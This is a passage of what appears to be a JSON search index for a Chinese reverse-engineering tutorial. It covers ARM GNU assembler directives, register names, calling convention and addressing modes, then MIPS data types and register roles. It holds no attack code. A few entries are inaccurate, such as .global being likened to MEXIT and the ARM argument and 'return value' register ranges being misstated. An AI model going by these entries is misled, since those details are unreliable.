\u201d\uff0c\u5141\u8bb8\u4e24\u4e2a\u8f93\u5165\u53c2\u6570\u3002\u901a\u8fc7\u4e86\u89e3\u8fd9\u4e2a\u7a0b\u5e8f\u5b9e\u4f8b\uff0c\u60f3\u5fc5\u63a5\u4e0b\u6765\u8fd9\u7c7b\u7a0b\u5e8f\u7684\u7406\u89e3\u6211\u4eec\u4e5f\u80fd\u591f\u5f88\u597d\u7684\u7684\u638c\u63e1\u3002","title":"3.5.1 \u5f15\u8a00"},{"location":"Tutorial/Material/Reverse/#352-arm-gnu","text":"\u5728 GNU \u6c47\u7f16\u7a0b\u5e8f\u4e0b\u7684 ARM \u6307\u4ee4\u96c6\u6db5\u62ec\u5982\u4e0b\uff1a GUN \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4 \u63cf\u8ff0 .ascii \"<string>\" \u5c06\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d .asciz \"<string>\" \u4e0e .ascii \u7c7b\u4f3c\uff0c\u4f46\u8ddf\u968f\u5b57\u7b26\u4e32\u7684\u96f6\u5b57\u8282 .balign <power_of_2> {,<fill_value>{,<max_padding>} } \u5c06\u5730\u5740\u4e0e <power_of_2> \u5b57\u8282\u5bf9\u9f50\u3002 \u6c47\u7f16\u7a0b\u5e8f\u901a\u8fc7\u6dfb\u52a0\u503c <fill_value> \u7684\u5b57\u8282\u6216\u5408\u9002\u7684\u9ed8\u8ba4\u503c\u6765\u5bf9\u9f50. \u5982\u679c\u9700\u8981\u8d85\u8fc7 <max_padding> \u8fd9\u4e2a\u6570\u5b57\u6765\u586b\u5145\u5b57\u8282\uff0c\u5219\u4e0d\u4f1a\u53d1\u751f\u5bf9\u9f50\uff08 \u7c7b\u4f3c\u4e8earmasm \u4e2d\u7684 ALIGN \uff09 .byte <byte1> {,<byte2> } \u2026 \u5c06\u4e00\u4e2a\u5b57\u8282\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d .code <number_of_bits> \u4ee5\u4f4d\u4e3a\u5355\u4f4d\u8bbe\u7f6e\u6307\u4ee4\u5bbd\u5ea6\u3002 \u4f7f\u7528 16 \u8868\u793a Thumb\uff0c32 \u8868\u793a ARM \u7a0b\u5e8f\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 CODE16 \u548c CODE32 \uff09 .else \u4e0e.if\u548c .endif \u4e00\u8d77\u4f7f\u7528\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 ELSE \uff09 .end \u6807\u8bb0\u7a0b\u5e8f\u6587\u4ef6\u7684\u7ed3\u5c3e\uff08 \u901a\u5e38\u7701\u7565 \uff09 .endif \u7ed3\u675f\u6761\u4ef6\u7f16\u8bd1\u4ee3\u7801\u5757 - \u53c2\u89c1.if\uff0c.ifdef\uff0c.ifndef\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 ENDIF \uff09 .endm \u7ed3\u675f\u5b8f\u5b9a\u4e49 - \u8bf7\u53c2\u9605 .macro\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEND \uff09 .endr \u7ed3\u675f\u91cd\u590d\u5faa\u73af - \u53c2\u89c1 .rept \u548c .irp\uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 WEND \uff09 .equ <symbol name>, <vallue> \u8be5\u6307\u4ee4\u8bbe\u7f6e\u7b26\u53f7\u7684\u503c\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 EQU \uff09 .err \u8fd9\u4e2a\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u505c\u6b62\u5e76\u51fa\u73b0\u9519\u8bef .exitm \u4e2d\u9014\u9000\u51fa\u4e00\u4e2a\u5b8f - \u53c2\u89c1 .macro\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEXIT \uff09 .global <symbol> \u8be5\u6307\u4ee4\u7ed9\u51fa\u7b26\u53f7\u5916\u90e8\u94fe\u63a5\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEXIT \uff09\u3002 .hword <short1> {,<short2> }... \u5c0616\u4f4d\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 DCW \uff09 .if <logical_expression> \u628a\u4e00\u6bb5\u4ee3\u7801\u53d8\u6210\u524d\u63d0\u6761\u4ef6\u3002 \u4f7f\u7528 .endif \u7ed3\u675f\u4ee3\u7801\u5757\uff08 \u7c7b\u4f3c\u4e8e armasm\u4e2d\u7684 IF \uff09\u3002 \u53e6\u89c1 .else .ifdef <symbol> \u5982\u679c\u5b9a\u4e49\u4e86 <symbol> \uff0c\u5219\u5305\u542b\u4e00\u6bb5\u4ee3\u7801\u3002 \u7ed3\u675f\u4ee3\u7801\u5757\u7528 .endif, \u8fd9\u5c31\u662f\u4e2a\u6761\u4ef6\u5224\u65ad\u561b, \u5f88\u7b80\u5355\u7684. .ifndef <symbol> \u5982\u679c\u672a\u5b9a\u4e49 <symbol> \uff0c\u5219\u5305\u542b\u4e00\u6bb5\u4ee3\u7801\u3002 \u7ed3\u675f\u4ee3\u7801\u5757\u7528 .endif, \u540c\u4e0a. .include \"<filename>\" \u5305\u62ec\u6307\u5b9a\u7684\u6e90\u6587\u4ef6, \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 INCLUDE \u6216 C \u4e2d\u7684#include .irp <param> {,<val 1>} {,<val_2>} ... \u4e3a\u503c\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u503c\u91cd\u590d\u4e00\u6b21\u4ee3\u7801\u5757\u3002 \u4f7f\u7528 .endr \u6307\u4ee4\u6807\u8bb0\u5757\u7684\u7ed3\u5c3e\u3002 \u5728\u91cc\u9762\u91cd\u590d\u4ee3\u7801\u5757\uff0c\u4f7f\u7528 \\<param> \u66ff\u6362\u5173\u8054\u7684\u4ee3\u7801\u5757\u503c\u5217\u8868\u4e2d\u7684\u503c\u3002 .macro <name> {<arg_1>} {,< arg_2>} ... {,<arg_N>} \u4f7f\u7528 N \u4e2a\u53c2\u6570\u5b9a\u4e49\u540d\u4e3a <name> \u7684\u6c47\u7f16\u7a0b\u5e8f\u5b8f\u3002\u5b8f\u5b9a\u4e49\u5fc5\u987b\u4ee5 .endm \u7ed3\u5c3e\u3002 \u8981\u5728\u8f83\u65e9\u7684\u65f6\u5019\u4ece\u5b8f\u4e2d\u9003\u8131\uff0c\u8bf7\u4f7f\u7528 .exitm \u3002 \u8fd9\u4e9b\u6307\u4ee4\u662f\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MACRO\uff0cMEND \u548cMEXIT\u3002 \u4f60\u5fc5\u987b\u5728\u865a\u62df\u5b8f\u53c2\u6570\u524d\u9762\u52a0 \\ . .rept <number_of_times> \u91cd\u590d\u7ed9\u5b9a\u6b21\u6570\u7684\u4ee3\u7801\u5757\u3002 \u4ee5 .endr \u7ed3\u675f\u3002 <register_name> .req <register_name> \u8be5\u6307\u4ee4\u547d\u540d\u4e00\u4e2a\u5bc4\u5b58\u5668\u3002 \u5b83\u4e0e armasm \u4e2d\u7684 RN \u6307\u4ee4\u7c7b\u4f3c\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u60a8\u5fc5\u987b\u5728\u53f3\u4fa7\u63d0\u4f9b\u540d\u79f0\u800c\u4e0d\u662f\u6570\u5b57\uff08\u4f8b\u5982\uff0c acc .req r0 \uff09 .section <section_name> {,\"<flags> \"} \u542f\u52a8\u65b0\u7684\u4ee3\u7801\u6216\u6570\u636e\u90e8\u5206\u3002 GNU \u4e2d\u6709\u8fd9\u4e9b\u90e8\u5206: .text \u4ee3\u7801\u90e8\u5206; .data \u521d\u59cb\u5316\u6570\u636e\u90e8\u5206\u548c .bss \u672a\u521d\u59cb\u5316\u6570\u636e\u90e8\u5206\u3002 \u8fd9\u4e9b\u90e8\u5206\u6709\u9ed8\u8ba4\u503cflags\u548c\u94fe\u63a5\u5668\u7406\u89e3\u9ed8\u8ba4\u540d\u79f0\uff08\u4e0earmasm\u6307\u4ee4AREA\u7c7b\u4f3c\u7684\u6307\u4ee4\uff09\u3002 \u4ee5\u4e0b\u662f ELF \u683c\u5f0f\u6587\u4ef6\u5141\u8bb8\u7684 .section\u6807\u5fd7\uff1a a \u8868\u793a allowable section w \u8868\u793a writable section x \u8868\u793a executable section .set <variable_name>, <variable_value> \u8be5\u6307\u4ee4\u8bbe\u7f6e\u53d8\u91cf\u7684\u503c\u3002 \u5b83\u7c7b\u4f3c\u4e8e SETA\u3002 .space <number_of_bytes> {,<fill_byte> } \u4fdd\u7559\u7ed9\u5b9a\u7684\u5b57\u8282\u6570\u3002 \u5982\u679c\u6307\u5b9a\u4e86\u5b57\u8282\uff0c\u5219\u586b\u5145\u96f6\u6216 <fill_byte> \uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 SPACE\uff09 .word <word1> {,<word2>}... \u5c06 32 \u4f4d\u5b57\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u96c6\u4e2d\uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 DCD\uff09\u3002","title":"3.5.2 ARM \u7684 GNU \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4\u8868"},{"location":"Tutorial/Material/Reverse/#353","text":"\u901a\u7528\u5bc4\u5b58\u5668\uff1a %r0 - %r15 fp \u5bc4\u5b58\u5668\uff1a %f0 - %f7 \u4e34\u65f6\u5bc4\u5b58\u5668\uff1a %r0 - %r3, %r12 \u4fdd\u5b58\u5bc4\u5b58\u5668\uff1a %r4 - %r10 \u5806\u6808 ptr \u5bc4\u5b58\u5668\uff1a %sp \u5e27 ptr \u5bc4\u5b58\u5668\uff1a %fp \u94fe\u63a5\u5bc4\u5b58\u5668\uff1a %lr \u7a0b\u5e8f\u8ba1\u6570\u5668\uff1a %ip \u72b6\u6001\u5bc4\u5b58\u5668\uff1a $psw \u72b6\u6001\u6807\u5fd7\u5bc4\u5b58\u5668\uff1a xPSR xPSR_all xPSR_f xPSR_x xPSR_ctl xPSR_fs xPSR_fx xPSR_fc xPSR_cs xPSR_cf xPSR_cx","title":"3.5.3 \u5bc4\u5b58\u5668\u540d\u79f0"},{"location":"Tutorial/Material/Reverse/#354","text":"\u5185\u8054\u8bc4\u8bba\u5b57\u7b26\uff1a '@' \u884c\u8bc4\u8bba\u5b57\u7b26\uff1a '\uff03' \u8bed\u53e5\u5206\u9694\u7b26\uff1a ';' \u7acb\u5373\u64cd\u4f5c\u6570\u524d\u7f00\uff1a '\uff03' \u6216 '$'","title":"3.5.4 \u6c47\u7f16\u7a0b\u5e8f\u7279\u6b8a\u5b57\u7b26/\u8bed\u6cd5"},{"location":"Tutorial/Material/Reverse/#355-arm","text":"\u53c2\u6570\u5bc4\u5b58\u5668 \uff1a\uff05a0 - \uff05a4\uff08\u522b\u540d\u4e3a\uff05r0 - \uff05r4\uff09 \u8fd4\u56de\u503cregs \uff1a\uff05v1 - \uff05v6\uff08\u522b\u540d\u4e3a\uff05r4 - \uff05r9\uff09","title":"3.5.5 arm\u7a0b\u5e8f\u8c03\u7528\u6807\u51c6"},{"location":"Tutorial/Material/Reverse/#356","text":"addr \u7edd\u5bf9\u5bfb\u5740\u6a21\u5f0f \uff05rn \u5bc4\u5b58\u5668\u76f4\u63a5\u5bfb\u5740 [\uff05rn] \u5bc4\u5b58\u5668\u95f4\u63a5\u5bfb\u5740\u6216\u7d22\u5f15 [\uff05rn\uff0c\uff03n] \u57fa\u4e8e\u5bc4\u5b58\u5668\u7684\u504f\u79fb\u91cf \u4e0a\u8ff0 \"rn\" \u6307\u4efb\u610f\u5bc4\u5b58\u5668\uff0c\u4f46\u4e0d\u5305\u62ec\u63a7\u5236\u5bc4\u5b58\u5668\u3002","title":"3.5.6 \u5bfb\u5740\u6a21\u5f0f"},{"location":"Tutorial/Material/Reverse/#357","text":"\u6307\u4ee4 \u63cf\u8ff0 .arm \u4f7f\u7528arm\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .thumb \u4f7f\u7528thumb\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .code16 \u4f7f\u7528thumb\u6a21\u5f0f\u8fdb\u884c\u88c5\u914d .code32 \u4f7f\u7528arm\u6a21\u5f0f\u8fdb\u884c\u7ec4\u88c5 .force_thumb Force thumb\u6a21\u5f0f\uff08\u5373\u4f7f\u4e0d\u652f\u6301\uff09 .thumb_func \u5c06\u8f93\u5165\u70b9\u6807\u8bb0\u4e3athumb\u7f16\u7801\uff08\u5f3a\u5236bx\u6761\u76ee\uff09 .ltorg \u542f\u52a8\u4e00\u4e2a\u65b0\u7684\u6587\u5b57\u6c60","title":"3.5.7 \u673a\u5668\u76f8\u5173\u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#36-mips","text":"","title":"3.6 MIPS\u6c47\u7f16\u57fa\u7840"},{"location":"Tutorial/Material/Reverse/#_15","text":"\u6570\u636e\u7c7b\u578b\uff1a \u6307\u4ee4\u5168\u662f32\u4f4d \u5b57\u8282\uff088\u4f4d\uff09\uff0c\u534a\u5b57\uff082\u5b57\u8282\uff09\uff0c\u5b57\uff084\u5b57\u8282\uff09 \u4e00\u4e2a\u5b57\u7b26\u9700\u89811\u4e2a\u5b57\u8282\u7684\u5b58\u50a8\u7a7a\u95f4 \u6574\u6570\u9700\u89811\u4e2a\u5b57\uff084\u4e2a\u5b57\u8282\uff09\u7684\u5b58\u50a8\u7a7a\u95f4 \u5e38\u91cf\uff1a \u6309\u539f\u6837\u8f93\u5165\u7684\u6570\u5b57\u3002\u4f8b\u5982 4 \u7528\u5355\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u3002\u4f8b\u5982 'b' \u7528\u53cc\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982 \u201cA string\u201d","title":"\u6570\u636e\u7c7b\u578b\u548c\u5e38\u91cf"},{"location":"Tutorial/Material/Reverse/#_16","text":"32\u4e2a\u901a\u7528\u5bc4\u5b58\u5668 \u5bc4\u5b58\u5668\u524d\u9762\u6709 $ \u4e24\u79cd\u683c\u5f0f\u7528\u4e8e\u5bfb\u5740\uff1a \u4f7f\u7528\u5bc4\u5b58\u5668\u53f7\u7801\uff0c\u4f8b\u5982 $ 0 \u5230 $ 31 \u4f7f\u7528\u522b\u540d\uff0c\u4f8b\u5982 $ t1 \uff0c $ sp \u7279\u6b8a\u5bc4\u5b58\u5668 Lo \u548c Hi \u7528\u4e8e\u5b58\u50a8\u4e58\u6cd5\u548c\u9664\u6cd5\u7684\u7ed3\u679c \u4e0d\u80fd\u76f4\u63a5\u5bfb\u5740; \u4f7f\u7528\u7279\u6b8a\u6307\u4ee4 mfhi \uff08 \u201c \u4ece Hi \u79fb\u52a8 \u201d \uff09\u548c mflo \uff08 \u201c \u4ece Lo \u79fb\u52a8 \u201d \uff09\u8bbf\u95ee\u7684\u5185\u5bb9 \u6808\u4ece\u9ad8\u5230\u4f4e\u589e\u957f \u5bc4\u5b58\u5668 \u522b\u540d \u7528\u9014 $0 $zero \u5e38\u91cf0(constant value 0) $1 $at \u4fdd\u7559\u7ed9\u6c47\u7f16\u5668(Reserved for assembler) $2-$3 $v0-$v1 \u51fd\u6570\u8c03\u7528\u8fd4\u56de\u503c(values for results and expression evaluation) $4-$7 $a0-$a3 \u51fd\u6570\u8c03\u7528\u53c2\u6570(arguments) $8-$15 $t0-$t7 \u6682\u65f6\u7684(\u6216\u968f\u4fbf\u7528\u7684) $16-$23 $s0-$s7 \u4fdd\u5b58\u7684(\u6216\u5982\u679c\u7528\uff0c\u9700\u8981SAVE/RESTORE\u7684)(saved) $24-$25 $t8-$t9 \u6682\u65f6\u7684(\u6216\u968f\u4fbf\u7528\u7684) $26~$27 $k0~$k1 \u4fdd\u7559\u4f9b\u4e2d\u65ad/\u9677\u9631\u5904\u7406\u7a0b\u5e8f\u4f7f\u7528 $28 $gp \u5168\u5c40\u6307\u9488(Global Pointer) $29 $sp \u5806\u6808\u6307\u9488(Stack Pointer) $30 $fp \u5e27\u6307\u9488(Frame Pointer) $31 $ra \u8fd4\u56de\u5730\u5740(return address) \u518d\u6765\u8bf4\u4e00\u8bf4\u8fd9\u4e9b\u5bc4\u5b58\u5668 : zero \u5b83\u4e00\u822c\u4f5c\u4e3a\u6e90\u5bc4\u5b58\u5668\uff0c\u8bfb\u5b83\u6c38\u8fdc\u8fd4\u56de 0\uff0c\u4e5f\u53ef\u4ee5\u5c06\u5b83\u4f5c\u4e3a\u76ee\u7684\u5bc4\u5b58\u5668\u5199\u6570\u636e\uff0c\u4f46\u6548\u679c\u7b49\u4e8e\u767d\u5199\u3002\u4e3a\u4ec0\u4e48\u5355\u72ec\u62c9\u4e00\u4e2a\u5bc4\u5b58\u5668\u51fa\u6765\u8fd4\u56de\u4e00\u4e2a\u6570\u5b57\u5462\uff1f\u7b54\u6848\u662f\u4e3a\u4e86\u6548\u7387\uff0cMIPS \u7684\u8bbe\u8ba1\u8005\u53ea\u5141\u8bb8\u5728\u5bc4\u5b58\u5668\u5185\u6267\u884c\u7b97\u672f\u64cd\u4f5c\uff0c\u800c\u4e0d\u5141\u8bb8\u76f4\u63a5\u64cd\u4f5c\u7acb\u5373\u6570\u3002\u6240\u4ee5\u5bf9\u6700\u5e38\u7528\u7684\u6570\u5b57 0 \u5355\u72ec\u7559\u4e86\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u4ee5\u63d0\u9ad8\u6548\u7387 at \u8be5\u5bc4\u5b58\u5668\u4e3a\u7ed9\u7f16\u8bd1\u5668\u4fdd\u7559\uff0c\u7528\u4e8e\u5904\u7406\u5728\u52a0\u8f7d 16 \u4f4d\u4ee5\u4e0a\u7684\u5927\u5e38\u6570\u65f6\u4f7f\u7528\uff0c\u7f16\u8bd1\u5668\u6216\u6c47\u7f16\u7a0b\u5e8f\u9700\u8981\u628a\u5927\u5e38\u6570\u62c6\u5f00\uff0c\u7136\u540e\u91cd\u65b0\u7ec4\u5408\u5230\u5bc4\u5b58\u5668\u91cc\u3002\u7cfb\u7edf\u7a0b\u5e8f\u5458\u4e5f\u53ef\u4ee5\u663e\u5f0f\u7684\u4f7f\u7528\u8fd9\u4e2a\u5bc4\u5b58\u5668\uff0c\u6709\u4e00\u4e2a\u6c47\u7f16 directive \u53ef\u88ab\u7528\u6765\u7981\u6b62\u6c47\u7f16\u5668\u5728 directive \u4e4b\u540e\u518d\u4f7f\u7528 at \u5bc4\u5b58\u5668\u3002 v0, v1.\u8fd9\u4e24\u4e2a\u5f88\u7b80\u5355\uff0c\u7528\u505a\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u5927\u90e8\u5206\u65f6\u5019\uff0c\u4f7f\u7528 v0 \u5c31\u591f\u4e86\u3002\u5982\u679c\u8fd4\u56de\u503c\u7684\u5927\u5c0f\u8d85\u8fc7 8 \u5b57\u8282\uff0c\u90a3\u5c31\u9700\u8981\u5206\u914d\u4f7f\u7528\u5806\u6808\uff0c\u8c03\u7528\u8005\u5728\u5806\u6808\u91cc\u5206\u914d\u4e00\u4e2a\u533f\u540d\u7684\u7ed3\u6784\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u6307\u5411\u8be5\u53c2\u6570\u7684\u6307\u9488\uff0c\u8fd4\u56de\u65f6 v0 \u6307\u5411\u8fd9\u4e2a\u5bf9\u5e94\u7684\u7ed3\u6784\uff0c\u8fd9\u4e9b\u90fd\u662f\u7531\u7f16\u8bd1\u5668\u81ea\u52a8\u5b8c\u6210\u3002 a0-a3. \u7528\u6765\u4f20\u9012\u51fd\u6570\u5165\u53c2\u7ed9\u5b50\u51fd\u6570\u3002\u770b\u4e00\u4e0b\u8fd9\u4e2a\u4f8b\u5b50\uff1a ret = strncmp(\"bear\",\"bearer\",4) \u53c2\u6570\u5c11\u4e8e 16 \u5b57\u8282\uff0c\u53ef\u4ee5\u653e\u5165\u5bc4\u5b58\u5668\u4e2d\uff0c\u5728 strncmp \u7684\u51fd\u6570\u91cc\uff0ca0 \u5b58\u653e\u7684\u662f \"bear\" \u8fd9\u4e2a\u5b57\u7b26\u4e32\u6240\u5728\u7684\u53ea\u8bfb\u533a\u5730\u5740\uff0ca1 \u662f \"bearer\" \u7684\u5730\u5740\uff0ca2 \u662f 4. t0-t9 \u4e34\u65f6\u5bc4\u5b58\u5668 s0-s8 \u4fdd\u7559\u5bc4\u5b58\u5668 \u8fd9\u4e24\u79cd\u5bc4\u5b58\u5668\u9700\u8981\u653e\u5728\u4e00\u8d77\u8bf4\uff0c\u5b83\u4eec\u662f mips \u6c47\u7f16\u91cc\u9762\u4ee3\u7801\u91cc\u89c1\u5230\u7684\u6700\u591a\u7684\u4e24\u79cd\u5bc4\u5b58\u5668\uff0c\u5b83\u4eec\u7684\u4f5c\u7528\u90fd\u662f\u5b58\u53d6\u6570\u636e\uff0c\u505a\u8ba1\u7b97\u3001\u79fb\u4f4d\u3001\u6bd4\u8f83\u3001\u52a0\u8f7d\u3001\u5b58\u50a8\u7b49\u7b49\uff0c\u533a\u522b\u5728\u4e8e\uff0ct0-t9 \u5728\u5b50\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u4f7f\u7528\u5176\u4e2d\u7684\u503c\uff0c\u5e76\u4e0d\u5fc5\u5b58\u50a8\u5b83\u4eec\uff0c\u5b83\u4eec\u5f88\u9002\u5408\u7528\u6765\u5b58\u653e\u8ba1\u7b97\u8868\u8fbe\u5f0f\u65f6\u4f7f\u7528\u7684\u201c\u4e34\u65f6\u201d\u53d8\u91cf\u3002\u5982\u679c\u8fd9\u4e9b\u53d8\u91cf\u7684\u4f7f\u7528\u8981\u8981\u8df3\u8f6c\u5230\u5b50\u51fd\u6570\u4e4b\u524d\u5b8c\u6210\uff0c\u56e0\u4e3a\u5b50\u51fd\u6570\u91cc\u5f88\u53ef\u80fd\u4f1a\u4f7f\u7528\u76f8\u540c\u7684\u5bc4\u5b58\u5668\uff0c\u800c\u4e14\u4e0d\u4f1a\u6709\u4efb\u4f55\u4fdd\u62a4\u3002\u5982\u679c\u5b50\u7a0b\u5e8f\u91cc\u4e0d\u4f1a\u8c03\u7528\u5176\u5b83\u51fd\u6570\u90a3\u4e48\u5efa\u8bae\u5c3d\u91cf\u591a\u7684\u4f7f\u7528t0-t9\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u51fd\u6570\u5165\u53e3\u5904\u7684\u4fdd\u5b58\u548c\u7ed3\u675f\u65f6\u7684\u6062\u590d\u3002 \u76f8\u53cd\u7684\uff0cs0-s8 \u5728\u5b50\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u9700\u8981\u5c06\u5b83\u4eec\u5b58\u50a8\u5728\u5806\u6808\u91cc\uff0c\u5e76\u5728\u5b50\u7a0b\u5e8f\u7ed3\u675f\u524d\u6062\u590d\u3002\u4ece\u800c\u5728\u8c03\u7528\u51fd\u6570\u770b\u6765\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u6ca1\u6709\u53d8\u5316\u3002 k0, k1. \u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u662f\u4e13\u95e8\u9884\u7559\u7ed9\u5f02\u5e38\u5904\u7406\u6d41\u7a0b\u4e2d\u4f7f\u7528\u3002\u5f02\u5e38\u5904\u7406\u6d41\u7a0b\u4e2d\u6709\u4ec0\u4e48\u7279\u522b\u7684\u5730\u65b9\u5417\uff1f\u5f53\u7136\u3002\u5f53 MIPS CPU \u5728\u4efb\u52a1\u91cc\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u4e00\u65e6\u6709\u5916\u90e8\u4e2d\u65ad\u6216\u8005\u5f02\u5e38\u53d1\u751f\uff0cCPU \u5c31\u4f1a\u7acb\u523b\u8df3\u8f6c\u5230\u4e00\u4e2a\u56fa\u5b9a\u5730\u5740\u7684\u5f02\u5e38 handler \u51fd\u6570\u6267\u884c\uff0c\u5e76\u540c\u65f6\u5c06\u5f02\u5e38\u7ed3\u675f\u540e\u8fd4\u56de\u5230\u4efb\u52a1\u7684\u6307\u4ee4\u5730\u5740\u8bb0\u5f55\u5728 EPC \u5bc4\u5b58\u5668\uff08Exception Program Counter\uff09\u91cc\u3002\u4e60\u60ef\u6027\u7684\uff0c\u5f02\u5e38 handler \u51fd\u6570\u5f00\u5934\u603b\u662f\u4f1a\u4fdd\u6301\u73b0\u573a\u5373 MIPS \u5bc4\u5b58\u5668\u5230\u4e2d\u65ad\u6808\u7a7a\u95f4\u91cc\uff0c\u800c\u5728\u5f02\u5e38\u8fd4\u56de\u524d\uff0c\u518d\u628a\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u6062\u590d\u56de\u53bb\u3002\u90a3\u5c31\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u4e2a EPC \u91cc\u7684\u503c\u5b58\u653e\u5728\u54ea\u91cc\uff1f\u5f02\u5e38 handler \u51fd\u6570\u7684\u6700\u540e\u80af\u5b9a\u662f\u4e00\u53e5 jr x \uff0cX \u662f\u4e00\u4e2a MIPS \u5bc4\u5b58\u5668\uff0c\u5982\u679c\u5b58\u653e\u5728\u524d\u9762\u63d0\u5230\u7684 t0,s0 \u7b49\u7b49\uff0c\u90a3\u4e48 PC \u8df3\u56de\u4efb\u52a1\u6267\u884c\u73b0\u573a\u65f6\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u91cc\u7684\u503c\u5c31\u4e0d\u518d\u662f\u5f02\u5e38\u53d1\u751f\u4e4b\u524d\u7684\u503c\u3002\u6240\u4ee5\u5fc5\u987b\u8981\u6709\u65f6\u5c31\u53ef\u4ee5\u4e00\u53e5 jr k0 \u6307\u4ee4\u8fd4\u56de\u4e86\u3002 k1 \u662f\u53e6\u5916\u4e00\u4e2a\u4e13\u4e3a\u5f02\u5e38\u800c\u751f\u7684\u5bc4\u5b58\u5668\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u4e2d\u65ad\u5d4c\u5957\u7684\u6df1\u5ea6\u3002CPU \u5728\u6267\u884c\u4efb\u52a1\u7a7a\u95f4\u7684\u4ee3\u7801\u65f6\uff0ck1 \u5c31\u53ef\u4ee5\u7f6e\u4e3a 0\uff0c\u8fdb\u5165\u5230\u4e2d\u65ad\u7a7a\u95f4\uff0c\u6bcf\u8fdb\u5165\u4e00\u6b21\u5c31\u52a0 1\uff0c\u9000\u51fa\u4e00\u6b21\u76f8\u5e94\u51cf 1\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8bb0\u5f55\u4e2d\u65ad\u5d4c\u5957\u7684\u6df1\u5ea6\u3002\u8fd9\u4e2a\u6df1\u5ea6\u5728\u8c03\u8bd5\u95ee\u9898\u7684\u65f6\u5019\u7ecf\u5e38\u4f1a\u7528\u5230\uff0c\u540c\u65f6\u5e94\u7528\u7a0b\u5e8f\u5728\u505a\u4e00\u6b21\u4e8b\u60c5\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u9700\u8981\u77e5\u9053\u5f53\u524d\u662f\u5728\u4efb\u52a1\u8fd8\u662f\u4e2d\u65ad\u4e0a\u4e0b\u6587\uff0c\u8fd9\u65f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 k1 \u5bc4\u5b58\u5668\u662f\u5426\u4e3a 0 \u6765\u5224\u65ad\u3002 sp \u6307\u5411\u5f53\u524d\u6b63\u5728\u64cd\u4f5c\u7684\u5806\u6808\u9876\u90e8\uff0c\u5b83\u6307\u5411\u5806\u6808\u4e2d\u7684\u4e0b\u4e00\u4e2a\u53ef\u5199\u5165\u7684\u5355\u5143\uff0c\u5982\u679c\u4ece\u6808\u9876\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u662f sp-1 \u5730\u5740\u7684\u5185\u5bb9\u3002\u5728\u6709 RTOS \u7684\u7cfb\u7edf\u91cc\uff0c\u6bcf\u4e2a task \u90fd\u6709\u81ea\u5df1\u7684\u4e00\u4e2a\u5806\u6808\u7a7a\u95f4\u548c\u5b9e\u65f6 sp \u526f\u672c\uff0c\u4e2d\u65ad\u4e5f\u6709\u81ea\u5df1\u7684\u5806\u6808\u7a7a\u95f4\u548c sp \u526f\u672c\uff0c\u5b83\u4eec\u4f1a\u5728\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\u4fdd\u5b58\u548c\u6062\u590d\u3002 gp \u8fd9\u662f\u4e00\u4e2a\u8f85\u52a9\u578b\u7684\u5bc4\u5b58\u5668\uff0c\u5176\u542b\u4e49\u8f83\u4e3a\u6a21\u7cca\uff0cMIPS \u5b98\u65b9\u4e3a\u8be5\u5bc4\u5b58\u5668\u63d0\u4f9b\u4e86\u4e24\u4e2a\u7528\u6cd5\u5efa\u8bae\uff0c\u4e00\u79cd\u662f\u6307\u5411 Linux \u5e94\u7528\u4e2d\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801\u4e4b\u5916\u7684\u6570\u636e\u5f15\u7528\u7684\u5168\u5c40\u504f\u79fb\u91cf\u8868\uff1b \u5728\u8fd0\u884c RTOS 